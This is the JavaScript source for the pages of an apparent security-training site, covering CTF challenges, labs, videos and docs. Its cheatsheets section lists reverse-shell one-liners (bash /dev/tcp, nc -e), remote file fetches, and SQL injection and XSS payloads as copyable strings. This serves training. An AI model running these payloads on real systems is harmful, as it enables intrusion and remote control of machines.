/* ============================================================
   FUNCTIONAL PAGES - Study Hub Platform
   Full implementations for all navbar pages
   ============================================================ */

// ==================== DAILY CTF PAGE ====================
function pageDailyCTF() {
    const challenges = UnifiedLearningData?.challenges?.jeopardy || {};
    const allChallenges = [];

    Object.entries(challenges).forEach(([category, items]) => {
        items.forEach(c => allChallenges.push({ ...c, categoryName: category }));
    });

    // Today's Challenge (pick based on day of year)
    const dayOfYear = Math.floor((Date.now() - new Date(new Date().getFullYear(), 0, 0)) / 86400000);
    const todaysChallenge = allChallenges[dayOfYear % allChallenges.length] || allChallenges[0];

    return `
        <div class="daily-ctf-page">
            <style>
                .daily-ctf-page { min-height: 100vh; background: linear-gradient(180deg, #0a0a1a 0%, #1a1a2e 100%); padding: 40px 20px; }
                .daily-container { max-width: 1200px; margin: 0 auto; }
                .daily-header { text-align: center; margin-bottom: 50px; }
                .daily-title { font-size: 2.5rem; font-weight: 800; color: #fff; font-family: 'Orbitron', sans-serif; }
                .daily-title i { color: #f59e0b; margin-right: 15px; }
                .daily-date { color: rgba(255,255,255,0.6); margin-top: 10px; font-size: 1.1rem; }
                .featured-challenge { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); border: 2px solid #f59e0b; border-radius: 20px; padding: 40px; margin-bottom: 50px; position: relative; overflow: hidden; }
                .featured-badge { position: absolute; top: 20px; right: 20px; background: linear-gradient(135deg, #f59e0b, #ea580c); color: #000; padding: 8px 20px; border-radius: 20px; font-weight: 700; font-size: 0.9rem; }
                .featured-content { display: grid; grid-template-columns: 1fr 300px; gap: 40px; align-items: center; }
                .featured-info h2 { font-size: 2rem; color: #fff; margin-bottom: 15px; }
                .featured-info p { color: rgba(255,255,255,0.7); font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px; }
                .featured-meta { display: flex; gap: 30px; margin-bottom: 25px; }
                .meta-item { display: flex; align-items: center; gap: 8px; color: rgba(255,255,255,0.6); }
                .meta-item i { color: #22c55e; }
                .featured-stats { text-align: center; background: rgba(0,0,0,0.3); padding: 30px; border-radius: 15px; }
                .points-display { font-size: 3rem; font-weight: 800; color: #f59e0b; font-family: 'Orbitron', sans-serif; }
                .points-label { color: rgba(255,255,255,0.5); margin-bottom: 20px; }
                .start-btn { display: inline-flex; align-items: center; gap: 10px; background: linear-gradient(135deg, #22c55e, #16a34a); color: #000; padding: 15px 35px; border-radius: 12px; font-weight: 700; font-size: 1.1rem; border: none; cursor: pointer; transition: all 0.3s; }
                .start-btn:hover { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(34, 197, 94, 0.4); }
                .section-title { font-size: 1.5rem; color: #fff; margin-bottom: 25px; display: flex; align-items: center; gap: 12px; }
                .section-title i { color: #22c55e; }
                .challenges-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
                .challenge-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 15px; padding: 25px; transition: all 0.3s; cursor: pointer; }
                .challenge-card:hover { transform: translateY(-5px); border-color: rgba(34, 197, 94, 0.5); background: rgba(255,255,255,0.08); }
                .challenge-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 15px; }
                .challenge-title { font-size: 1.2rem; color: #fff; font-weight: 600; }
                .challenge-points { background: rgba(34, 197, 94, 0.2); color: #22c55e; padding: 5px 12px; border-radius: 8px; font-weight: 700; font-size: 0.9rem; }
                .challenge-desc { color: rgba(255,255,255,0.6); font-size: 0.95rem; line-height: 1.5; margin-bottom: 15px; }
                .challenge-meta { display: flex; gap: 15px; flex-wrap: wrap; }
                .challenge-tag { background: rgba(255,255,255,0.1); color: rgba(255,255,255,0.7); padding: 4px 10px; border-radius: 6px; font-size: 0.8rem; }
                .difficulty-easy { border-left: 3px solid #22c55e; }
                .difficulty-medium { border-left: 3px solid #f59e0b; }
                .difficulty-hard { border-left: 3px solid #ef4444; }
                @media (max-width: 768px) { .featured-content { grid-template-columns: 1fr; } }
            </style>

            <div class="daily-container">
                <div class="daily-header">
                    <h1 class="daily-title"><i class="fa-solid fa-calendar-day"></i> Daily CTF Challenge</h1>
                    <p class="daily-date">${new Date().toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })}</p>
                </div>

                <div class="featured-challenge">
                    <div class="featured-badge"><i class="fa-solid fa-star"></i> TODAY'S CHALLENGE</div>
                    <div class="featured-content">
                        <div class="featured-info">
                            <h2>${todaysChallenge?.title || 'The Cookie Monster'}</h2>
                            <p>${todaysChallenge?.description || 'Manipulate cookies to gain admin access'}</p>
                            <div class="featured-meta">
                                <div class="meta-item"><i class="fa-solid fa-signal"></i> ${todaysChallenge?.difficulty || 'Easy'}</div>
                                <div class="meta-item"><i class="fa-solid fa-folder"></i> ${todaysChallenge?.categoryName || 'Web'}</div>
                                <div class="meta-item"><i class="fa-solid fa-users"></i> ${todaysChallenge?.solves || 0} solves</div>
                            </div>
                            <button class="start-btn" onclick="loadPage('practice')">
                                <i class="fa-solid fa-play"></i> Start Challenge
                            </button>
                        </div>
                        <div class="featured-stats">
                            <div class="points-display">${todaysChallenge?.points || 100}</div>
                            <div class="points-label">POINTS</div>
                        </div>
                    </div>
                </div>

                <h2 class="section-title"><i class="fa-solid fa-fire"></i> More Challenges</h2>
                <div class="challenges-grid">
                    ${allChallenges.slice(0, 9).map(c => `
                        <div class="challenge-card difficulty-${c.difficulty}" onclick="loadPage('practice')">
                            <div class="challenge-header">
                                <div class="challenge-title">${c.title}</div>
                                <div class="challenge-points">${c.points} pts</div>
                            </div>
                            <div class="challenge-desc">${c.description}</div>
                            <div class="challenge-meta">
                                <span class="challenge-tag">${c.categoryName}</span>
                                <span class="challenge-tag">${c.difficulty}</span>
                            </div>
                        </div>
                    `).join('')}
                </div>
            </div>
        </div>
    `;
}

// ==================== PAST CTF PAGE ====================
function pagePastCTF() {
    const pastEvents = [
        { id: 1, name: 'Winter Hack 2024', date: '2024-01-15', participants: 1250, winners: ['CyberNinja', 'H4ck3rX', 'SecPro'] },
        { id: 2, name: 'Spring CTF 2024', date: '2024-03-20', participants: 890, winners: ['RedTeamer', 'PenTestKing', 'BugHunter'] },
        { id: 3, name: 'Summer Showdown', date: '2024-06-01', participants: 1540, winners: ['ZeroDay', 'ScriptKid', 'NetNinja'] },
        { id: 4, name: 'Fall Frenzy 2024', date: '2024-09-15', participants: 2100, winners: ['EliteHacker', 'CyberWolf', 'DarkPhoenix'] },
        { id: 5, name: 'Holiday Hack 2024', date: '2024-12-01', participants: 1800, winners: ['StudyHubPro', 'HackMaster', 'CodeBreaker'] }
    ];

    return `
        <div class="past-ctf-page">
            <style>
                .past-ctf-page { min-height: 100vh; background: linear-gradient(180deg, #0a0a1a 0%, #1a1a2e 100%); padding: 40px 20px; }
                .past-container { max-width: 1000px; margin: 0 auto; }
                .past-header { text-align: center; margin-bottom: 50px; }
                .past-title { font-size: 2.5rem; font-weight: 800; color: #fff; font-family: 'Orbitron', sans-serif; }
                .past-title i { color: #a855f7; margin-right: 15px; }
                .past-subtitle { color: rgba(255,255,255,0.6); margin-top: 10px; }
                .event-list { display: flex; flex-direction: column; gap: 20px; }
                .event-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 30px; display: grid; grid-template-columns: 1fr 150px 200px; gap: 30px; align-items: center; transition: all 0.3s; }
                .event-card:hover { border-color: rgba(168, 85, 247, 0.5); background: rgba(255,255,255,0.08); }
                .event-info h3 { font-size: 1.3rem; color: #fff; margin-bottom: 8px; }
                .event-date { color: rgba(255,255,255,0.5); font-size: 0.9rem; }
                .event-date i { margin-right: 8px; color: #a855f7; }
                .event-stats { text-align: center; }
                .stat-value { font-size: 1.8rem; font-weight: 700; color: #22c55e; }
                .stat-label { color: rgba(255,255,255,0.5); font-size: 0.85rem; }
                .event-winners h4 { color: rgba(255,255,255,0.5); font-size: 0.85rem; margin-bottom: 10px; }
                .winner { display: flex; align-items: center; gap: 8px; color: #fff; font-size: 0.9rem; padding: 3px 0; }
                .winner i { width: 18px; }
                .winner:nth-child(1) i { color: #ffd700; }
                .winner:nth-child(2) i { color: #c0c0c0; }
                .winner:nth-child(3) i { color: #cd7f32; }
                .view-btn { background: rgba(168, 85, 247, 0.2); color: #a855f7; padding: 10px 20px; border-radius: 8px; border: 1px solid rgba(168, 85, 247, 0.3); cursor: pointer; font-weight: 600; transition: all 0.3s; margin-top: 15px; }
                .view-btn:hover { background: #a855f7; color: #fff; }
                @media (max-width: 768px) { .event-card { grid-template-columns: 1fr; text-align: center; } }
            </style>

            <div class="past-container">
                <div class="past-header">
                    <h1 class="past-title"><i class="fa-solid fa-clock-rotate-left"></i> Past CTF Events</h1>
                    <p class="past-subtitle">Browse writeups and results from previous competitions</p>
                </div>

                <div class="event-list">
                    ${pastEvents.map(event => `
                        <div class="event-card">
                            <div class="event-info">
                                <h3>${event.name}</h3>
                                <div class="event-date"><i class="fa-solid fa-calendar"></i> ${new Date(event.date).toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' })}</div>
                                <button class="view-btn" onclick="showToast('Writeups coming soon!', 'info')">
                                    <i class="fa-solid fa-book-open"></i> View Writeups
                                </button>
                            </div>
                            <div class="event-stats">
                                <div class="stat-value">${event.participants.toLocaleString()}</div>
                                <div class="stat-label">Participants</div>
                            </div>
                            <div class="event-winners">
                                <h4><i class="fa-solid fa-medal"></i> Top 3 Winners</h4>
                                ${event.winners.map((w, i) => `
                                    <div class="winner"><i class="fa-solid fa-trophy"></i> ${w}</div>
                                `).join('')}
                            </div>
                        </div>
                    `).join('')}
                </div>
            </div>
        </div>
    `;
}

// ==================== FREE LABS PAGE ====================
function pageFreeLabs() {
    const paths = UnifiedLearningData?.paths || [];
    const freeRooms = [];

    paths.forEach(path => {
        path.units?.forEach(unit => {
            unit.rooms?.forEach(room => {
                if (!room.isPremium) {
                    freeRooms.push({ ...room, pathName: path.name, unitName: unit.name });
                }
            });
        });
    });

    return `
        <div class="free-labs-page">
            <style>
                .free-labs-page { min-height: 100vh; background: linear-gradient(180deg, #0a0a1a 0%, #1a1a2e 100%); padding: 40px 20px; }
                .labs-container { max-width: 1200px; margin: 0 auto; }
                .labs-header { text-align: center; margin-bottom: 50px; }
                .labs-title { font-size: 2.5rem; font-weight: 800; color: #fff; font-family: 'Orbitron', sans-serif; }
                .labs-title i { color: #22c55e; margin-right: 15px; }
                .labs-subtitle { color: rgba(255,255,255,0.6); margin-top: 10px; }
                .labs-count { background: rgba(34, 197, 94, 0.2); color: #22c55e; padding: 8px 20px; border-radius: 20px; display: inline-block; margin-top: 15px; font-weight: 600; }
                .labs-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; }
                .lab-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 25px; transition: all 0.3s; cursor: pointer; }
                .lab-card:hover { transform: translateY(-5px); border-color: rgba(34, 197, 94, 0.5); }
                .lab-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 15px; }
                .lab-title { font-size: 1.2rem; color: #fff; font-weight: 600; }
                .lab-free-badge { background: linear-gradient(135deg, #22c55e, #16a34a); color: #000; padding: 4px 12px; border-radius: 6px; font-size: 0.75rem; font-weight: 700; }
                .lab-desc { color: rgba(255,255,255,0.6); font-size: 0.95rem; line-height: 1.5; margin-bottom: 15px; }
                .lab-meta { display: flex; gap: 15px; flex-wrap: wrap; margin-bottom: 15px; }
                .lab-meta-item { display: flex; align-items: center; gap: 6px; color: rgba(255,255,255,0.5); font-size: 0.85rem; }
                .lab-meta-item i { color: #22c55e; }
                .lab-path { background: rgba(255,255,255,0.1); color: rgba(255,255,255,0.7); padding: 6px 12px; border-radius: 6px; font-size: 0.8rem; display: inline-block; }
                .start-lab-btn { width: 100%; background: linear-gradient(135deg, #22c55e, #16a34a); color: #000; padding: 12px; border: none; border-radius: 10px; font-weight: 700; cursor: pointer; margin-top: 15px; transition: all 0.3s; }
                .start-lab-btn:hover { transform: scale(1.02); box-shadow: 0 10px 30px rgba(34, 197, 94, 0.3); }
            </style>

            <div class="labs-container">
                <div class="labs-header">
                    <h1 class="labs-title"><i class="fa-solid fa-flask"></i> Free Labs</h1>
                    <p class="labs-subtitle">Start learning with our free hands-on labs</p>
                    <div class="labs-count"><i class="fa-solid fa-check"></i> ${freeRooms.length} Free Labs Available</div>
                </div>

                <div class="labs-grid">
                    ${freeRooms.slice(0, 12).map(room => `
                        <div class="lab-card" onclick="loadPage('room-viewer:${room.id}')">
                            <div class="lab-header">
                                <div class="lab-title">${room.title}</div>
                                <div class="lab-free-badge">FREE</div>
                            </div>
                            <div class="lab-desc">${room.description}</div>
                            <div class="lab-meta">
                                <div class="lab-meta-item"><i class="fa-solid fa-clock"></i> ${room.estimatedTime || '30 min'}</div>
                                <div class="lab-meta-item"><i class="fa-solid fa-star"></i> ${room.points || 50} pts</div>
                                <div class="lab-meta-item"><i class="fa-solid fa-signal"></i> ${room.difficulty || 'Easy'}</div>
                            </div>
                            <div class="lab-path"><i class="fa-solid fa-road"></i> ${room.pathName}</div>
                            <button class="start-lab-btn"><i class="fa-solid fa-play"></i> Start Lab</button>
                        </div>
                    `).join('')}
                </div>
            </div>
        </div>
    `;
}

// ==================== PRO LABS PAGE ====================
function pageProLabs() {
    const premiumLabs = [
        {
            id: 'ad-forest-pro',
            title: 'Enterprise AD Forest Compromise',
            desc: 'Simulated multi-forest environment. Pivot from DMZ to Domain Admin using BloodHound, Kerberoasting, and GPO abuse. Includes real-world CVE-2022-XXXX scenarios.',
            time: '12 hours',
            points: 1500,
            skills: ['Active Directory', 'Cobalt Strike', 'Mimikatz', 'BloodHound']
        },
        {
            id: 'cloud-aws-breach',
            title: 'AWS Cloud Breach: Skylight',
            desc: 'Full-chain AWS attack. Exploit SSRF in EC2, pivot to IAM roles, enumerate S3 buckets, and exfiltrate data. Based on the Capital One breach methodology.',
            time: '8 hours',
            points: 1200,
            skills: ['AWS CLI', 'Pacu', 'SSRF', 'IAM Evasion']
        },
        {
            id: 'apt-sim-lazarus',
            title: 'APT Simulation: Lazarus Group',
            desc: 'Emulate the TTPs of North Korean state hackers. Phishing entry, custom malware dropper analysis, and lateral movement in a banking network.',
            time: '24 hours',
            points: 2500,
            skills: ['Malware Analysis', 'C2 Infra', 'Lateral Movement', 'OPSEC']
        },
        {
            id: 'ics-scada-water',
            title: 'SCADA/ICS: Water Treatment',
            desc: 'Critical Infrastructure hacking. Analyze Modbus traffic, exploit PLC logic vulnerabilities, and manipulate HMI controls in a safe OT environment.',
            time: '6 hours',
            points: 1000,
            skills: ['Modbus', 'PLC Programming', 'OT Security', 'Wireshark']
        },
        {
            id: 'devsecops-pipeline',
            title: 'DevSecOps: Pipeline Poisoning',
            desc: 'Attack the CI/CD supply chain. Inject malicious code into Jenkins, breakout from Docker containers, and compromise the Kubernetes cluster.',
            time: '10 hours',
            points: 1300,
            skills: ['Jenkins', 'Docker Breakout', 'Kubernetes', 'Supply Chain']
        },
        {
            id: 'ransom-sim-lockbit',
            title: 'Ransomware Sim: LockBit 3.0',
            desc: 'Blue Team Special. Investigate a live ransomware execution. Analyze the encryptor, recover shadow copies, and derive C2 IOCs for containment.',
            time: '5 hours',
            points: 800,
            skills: ['Forensics', 'Reverse Engineering', 'Incident Response', 'YARA']
        }
    ];

    const isPremium = localStorage.getItem('userSubscription');

    return `
        <div class="pro-labs-page">
            <style>
                .pro-labs-page { min-height: 100vh; background: linear-gradient(180deg, #0a0a1a 0%, #1a1a2e 100%); padding: 40px 20px; }
                .pro-container { max-width: 1200px; margin: 0 auto; }
                .pro-header { text-align: center; margin-bottom: 50px; }
                .pro-title { font-size: 2.5rem; font-weight: 800; color: #fff; font-family: 'Orbitron', sans-serif; }
                .pro-title i { color: #a855f7; margin-right: 15px; }
                .pro-subtitle { color: rgba(255,255,255,0.6); margin-top: 10px; }
                .upgrade-banner { background: linear-gradient(135deg, #a855f7 0%, #6366f1 100%); border-radius: 20px; padding: 40px; text-align: center; margin-bottom: 40px; }
                .upgrade-banner h2 { color: #fff; font-size: 1.8rem; margin-bottom: 15px; }
                .upgrade-banner p { color: rgba(255,255,255,0.8); margin-bottom: 20px; }
                .upgrade-btn { background: #fff; color: #a855f7; padding: 15px 40px; border-radius: 12px; font-weight: 700; font-size: 1.1rem; border: none; cursor: pointer; }
                .pro-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; }
                .pro-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(168, 85, 247, 0.3); border-radius: 16px; padding: 25px; position: relative; overflow: hidden; }
                .pro-badge { position: absolute; top: 15px; right: 15px; background: linear-gradient(135deg, #a855f7, #6366f1); color: #fff; padding: 5px 12px; border-radius: 6px; font-size: 0.75rem; font-weight: 700; }
                .pro-card-title { font-size: 1.3rem; color: #fff; font-weight: 600; margin-bottom: 10px; }
                .pro-card-desc { color: rgba(255,255,255,0.6); margin-bottom: 15px; }
                .pro-card-meta { display: flex; gap: 15px; margin-bottom: 15px; }
                .pro-meta-item { display: flex; align-items: center; gap: 6px; color: rgba(255,255,255,0.5); font-size: 0.85rem; }
                .pro-meta-item i { color: #a855f7; }
                .pro-skills { display: flex; gap: 8px; flex-wrap: wrap; }
                .pro-skill { background: rgba(168, 85, 247, 0.2); color: #a855f7; padding: 4px 10px; border-radius: 6px; font-size: 0.8rem; }
                .pro-card-btn { width: 100%; background: ${isPremium ? 'linear-gradient(135deg, #22c55e, #16a34a)' : 'rgba(255,255,255,0.1)'}; color: ${isPremium ? '#000' : 'rgba(255,255,255,0.5)'}; padding: 12px; border: none; border-radius: 10px; font-weight: 600; cursor: ${isPremium ? 'pointer' : 'not-allowed'}; margin-top: 15px; }
                .locked-overlay { position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); display: ${isPremium ? 'none' : 'flex'}; align-items: center; justify-content: center; border-radius: 16px; }
                .locked-icon { font-size: 3rem; color: rgba(255,255,255,0.3); }
            </style>

            <div class="pro-container">
                <div class="pro-header">
                    <h1 class="pro-title"><i class="fa-solid fa-crown"></i> Pro Labs</h1>
                    <p class="pro-subtitle">Advanced hands-on labs for serious practitioners</p>
                </div>

                ${!isPremium ? `
                <div class="upgrade-banner">
                    <h2><i class="fa-solid fa-unlock"></i> Unlock All Pro Labs</h2>
                    <p>Get unlimited access to advanced labs, exclusive content, and more</p>
                    <button class="upgrade-btn" onclick="loadPage('subscribe')"><i class="fa-solid fa-rocket"></i> Go Premium</button>
                </div>
                ` : ''}

                <div class="pro-grid">
                    ${premiumLabs.map(lab => `
                        <div class="pro-card">
                            <div class="pro-badge">PRO</div>
                            <h3 class="pro-card-title">${lab.title}</h3>
                            <p class="pro-card-desc">${lab.desc}</p>
                            <div class="pro-card-meta">
                                <div class="pro-meta-item"><i class="fa-solid fa-clock"></i> ${lab.time}</div>
                                <div class="pro-meta-item"><i class="fa-solid fa-star"></i> ${lab.points} pts</div>
                            </div>
                            <div class="pro-skills">
                                ${lab.skills.map(s => `<span class="pro-skill">${s}</span>`).join('')}
                            </div>
                            <button class="pro-card-btn" ${isPremium ? `onclick="loadPage('room-viewer:${lab.id}')"` : 'disabled'}>
                                ${isPremium ? '<i class="fa-solid fa-play"></i> Start Lab' : '<i class="fa-solid fa-lock"></i> Unlock with Premium'}
                            </button>
                            <div class="locked-overlay"><i class="fa-solid fa-lock locked-icon"></i></div>
                        </div>
                    `).join('')}
                </div>
            </div>
        </div>
    `;
}

// Make functions globally available
window.pageDailyCTF = pageDailyCTF;
window.pageDailyCtf = pageDailyCTF;
window.pagePastCTF = pagePastCTF;
window.pagePastCtf = pagePastCTF;
window.pageFreeLabs = pageFreeLabs;
window.pageProLabs = pageProLabs;

// ==================== CHEATSHEETS PAGE ====================
function pageCheatsheets() {
    const cheatsheets = [
        { title: 'Nmap Commands', icon: 'fa-network-wired', color: '#22c55e', category: 'Scanning', items: ['nmap -sV -sC target', 'nmap -p- target', 'nmap -A target', 'nmap --script vuln target'] },
        { title: 'SQLi Payloads', icon: 'fa-database', color: '#ef4444', category: 'Web', items: ["' OR '1'='1", "admin'--", "UNION SELECT null,null--", "' AND 1=1--"] },
        { title: 'XSS Payloads', icon: 'fa-code', color: '#f59e0b', category: 'Web', items: ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>', 'javascript:alert(1)'] },
        { title: 'Linux PrivEsc', icon: 'fab fa-linux', color: '#3b82f6', category: 'PrivEsc', items: ['find / -perm -4000 2>/dev/null', 'sudo -l', 'cat /etc/crontab', 'getcap -r / 2>/dev/null'] },
        { title: 'Windows PrivEsc', icon: 'fab fa-windows', color: '#06b6d4', category: 'PrivEsc', items: ['whoami /priv', 'systeminfo', 'net user', 'wmic service list'] },
        { title: 'Reverse Shells', icon: 'fa-terminal', color: '#a855f7', category: 'Exploitation', items: ['bash -i >& /dev/tcp/IP/PORT 0>&1', 'nc -e /bin/sh IP PORT', 'python -c "import socket..."', 'php -r "$sock=fsockopen..."'] },
        { title: 'File Transfers', icon: 'fa-file-export', color: '#ec4899', category: 'Post-Exploit', items: ['python3 -m http.server', 'wget http://IP/file', 'curl -O http://IP/file', 'scp file user@IP:/path'] },
        { title: 'Burp Suite Tips', icon: 'fa-spider', color: '#f97316', category: 'Tools', items: ['Intercept requests', 'Send to Repeater', 'Intruder for fuzzing', 'Match and Replace'] }
    ];

    return `
        <div class="cheatsheets-page">
            <style>
                .cheatsheets-page { min-height: 100vh; background: linear-gradient(180deg, #0a0a1a 0%, #1a1a2e 100%); padding: 40px 20px; }
                .sheets-container { max-width: 1200px; margin: 0 auto; }
                .sheets-header { text-align: center; margin-bottom: 50px; }
                .sheets-title { font-size: 2.5rem; font-weight: 800; color: #fff; font-family: 'Orbitron', sans-serif; }
                .sheets-title i { color: #22c55e; margin-right: 15px; }
                .sheets-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
                .sheet-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 25px; transition: all 0.3s; }
                .sheet-card:hover { border-color: var(--sheet-color); transform: translateY(-5px); }
                .sheet-header { display: flex; align-items: center; gap: 15px; margin-bottom: 20px; }
                .sheet-icon { width: 50px; height: 50px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; }
                .sheet-title { font-size: 1.2rem; color: #fff; font-weight: 600; }
                .sheet-category { color: rgba(255,255,255,0.5); font-size: 0.85rem; }
                .sheet-items { display: flex; flex-direction: column; gap: 8px; }
                .sheet-item { background: rgba(0,0,0,0.3); padding: 10px 15px; border-radius: 8px; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; color: #22c55e; cursor: pointer; transition: all 0.2s; }
                .sheet-item:hover { background: rgba(34, 197, 94, 0.2); }
                .copy-icon { float: right; color: rgba(255,255,255,0.3); }
            </style>

            <div class="sheets-container">
                <div class="sheets-header">
                    <h1 class="sheets-title"><i class="fa-solid fa-scroll"></i> Security Cheatsheets</h1>
                    <p style="color: rgba(255,255,255,0.6);">Quick reference for common commands and payloads</p>
                </div>

                <div class="sheets-grid">
                    ${cheatsheets.map(sheet => `
                        <div class="sheet-card" style="--sheet-color: ${sheet.color};">
                            <div class="sheet-header">
                                <div class="sheet-icon" style="background: ${sheet.color}20; color: ${sheet.color};">
                                    <i class="${sheet.icon.includes('fab') ? sheet.icon : 'fa-solid ' + sheet.icon}"></i>
                                </div>
                                <div>
                                    <div class="sheet-title">${sheet.title}</div>
                                    <div class="sheet-category">${sheet.category}</div>
                                </div>
                            </div>
                            <div class="sheet-items">
                                ${sheet.items.map(item => `
                                    <div class="sheet-item" onclick="navigator.clipboard.writeText('${item.replace(/'/g, "\\'")}'); showToast('Copied!', 'success');">
                                        ${item.replace(/</g, '&lt;').replace(/>/g, '&gt;')}
                                        <i class="fa-solid fa-copy copy-icon"></i>
                                    </div>
                                `).join('')}
                            </div>
                        </div>
                    `).join('')}
                </div>
            </div>
        </div>
    `;
}

// ==================== VIDEOS PAGE ====================
function pageVideos() {
    const videoCategories = [
        {
            name: 'Web Application Security', icon: 'fa-globe', videos: [
                { title: 'SQL Injection Masterclass', author: 'StudyHub', duration: '45:00', views: '12K' },
                { title: 'XSS for Beginners', author: 'StudyHub', duration: '30:00', views: '8.5K' },
                { title: 'IDOR Exploitation', author: 'StudyHub', duration: '25:00', views: '6.2K' }
            ]
        },
        {
            name: 'Network Security', icon: 'fa-network-wired', videos: [
                { title: 'Nmap Deep Dive', author: 'StudyHub', duration: '55:00', views: '15K' },
                { title: 'Wireshark Analysis', author: 'StudyHub', duration: '40:00', views: '9.8K' },
                { title: 'Metasploit Framework', author: 'StudyHub', duration: '60:00', views: '11K' }
            ]
        },
        {
            name: 'CTF Walkthroughs', icon: 'fa-flag', videos: [
                { title: 'HackTheBox - Easy Machine', author: 'StudyHub', duration: '35:00', views: '7.2K' },
                { title: 'TryHackMe - Web Series', author: 'StudyHub', duration: '28:00', views: '5.5K' },
                { title: 'PicoCTF Solutions', author: 'StudyHub', duration: '42:00', views: '8.1K' }
            ]
        }
    ];

    return `
        <div class="videos-page">
            <style>
                .videos-page { min-height: 100vh; background: linear-gradient(180deg, #0a0a1a 0%, #1a1a2e 100%); padding: 40px 20px; }
                .videos-container { max-width: 1200px; margin: 0 auto; }
                .videos-header { text-align: center; margin-bottom: 50px; }
                .videos-title { font-size: 2.5rem; font-weight: 800; color: #fff; font-family: 'Orbitron', sans-serif; }
                .videos-title i { color: #ef4444; margin-right: 15px; }
                .category-section { margin-bottom: 40px; }
                .category-title { font-size: 1.3rem; color: #fff; margin-bottom: 20px; display: flex; align-items: center; gap: 12px; }
                .category-title i { color: #22c55e; }
                .videos-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
                .video-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; overflow: hidden; cursor: pointer; transition: all 0.3s; }
                .video-card:hover { transform: translateY(-5px); border-color: rgba(239, 68, 68, 0.5); }
                .video-thumb { height: 160px; background: linear-gradient(135deg, #1a1a2e, #16213e); display: flex; align-items: center; justify-content: center; position: relative; }
                .play-btn { width: 60px; height: 60px; background: rgba(239, 68, 68, 0.9); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 1.5rem; }
                .video-duration { position: absolute; bottom: 10px; right: 10px; background: rgba(0,0,0,0.8); color: #fff; padding: 4px 8px; border-radius: 4px; font-size: 0.8rem; }
                .video-info { padding: 20px; }
                .video-title { color: #fff; font-weight: 600; margin-bottom: 8px; }
                .video-meta { display: flex; gap: 15px; color: rgba(255,255,255,0.5); font-size: 0.85rem; }
            </style>

            <div class="videos-container">
                <div class="videos-header">
                    <h1 class="videos-title"><i class="fa-solid fa-play-circle"></i> Video Tutorials</h1>
                    <p style="color: rgba(255,255,255,0.6);">Learn through hands-on video content</p>
                </div>

                ${videoCategories.map(cat => `
                    <div class="category-section">
                        <h2 class="category-title"><i class="fa-solid ${cat.icon}"></i> ${cat.name}</h2>
                        <div class="videos-grid">
                            ${cat.videos.map(video => `
                                <div class="video-card" onclick="showToast('Video player coming soon!', 'info')">
                                    <div class="video-thumb">
                                        <div class="play-btn"><i class="fa-solid fa-play"></i></div>
                                        <div class="video-duration">${video.duration}</div>
                                    </div>
                                    <div class="video-info">
                                        <div class="video-title">${video.title}</div>
                                        <div class="video-meta">
                                            <span><i class="fa-solid fa-user"></i> ${video.author}</span>
                                            <span><i class="fa-solid fa-eye"></i> ${video.views}</span>
                                        </div>
                                    </div>
                                </div>
                            `).join('')}
                        </div>
                    </div>
                `).join('')}
            </div>
        </div>
    `;
}

// ==================== DOCS PAGE ====================
function pageDocs() {
    const docs = [
        { title: 'Getting Started', icon: 'fa-rocket', desc: 'New to BreachLabs? Start here!', sections: ['Create Account', 'First Path', 'Earn XP'] },
        { title: 'Learning Paths', icon: 'fa-road', desc: 'How paths and rooms work', sections: ['Path Structure', 'Completion', 'Certificates'] },
        { title: 'CTF Challenges', icon: 'fa-flag', desc: 'Guide to capture the flag', sections: ['Categories', 'Flags', 'Scoring'] },
        { title: 'Labs & Machines', icon: 'fa-server', desc: 'Hands-on practice environments', sections: ['Starting Labs', 'VPN Setup', 'Troubleshooting'] },
        { title: 'Subscriptions', icon: 'fa-crown', desc: 'Premium features explained', sections: ['Plans', 'Benefits', 'Billing'] },
        { title: 'API Documentation', icon: 'fa-code', desc: 'For developers', sections: ['Authentication', 'Endpoints', 'Rate Limits'] }
    ];

    return `
        <div class="docs-page">
            <style>
                .docs-page { min-height: 100vh; background: linear-gradient(180deg, #0a0a1a 0%, #1a1a2e 100%); padding: 40px 20px; }
                .docs-container { max-width: 1000px; margin: 0 auto; }
                .docs-header { text-align: center; margin-bottom: 50px; }
                .docs-title { font-size: 2.5rem; font-weight: 800; color: #fff; font-family: 'Orbitron', sans-serif; }
                .docs-title i { color: #3b82f6; margin-right: 15px; }
                .docs-search { max-width: 500px; margin: 20px auto 0; }
                .docs-search input { width: 100%; padding: 15px 20px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: #fff; font-size: 1rem; }
                .docs-search input::placeholder { color: rgba(255,255,255,0.4); }
                .docs-grid { display: grid; gap: 20px; }
                .doc-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 25px; display: grid; grid-template-columns: 60px 1fr auto; gap: 20px; align-items: center; cursor: pointer; transition: all 0.3s; }
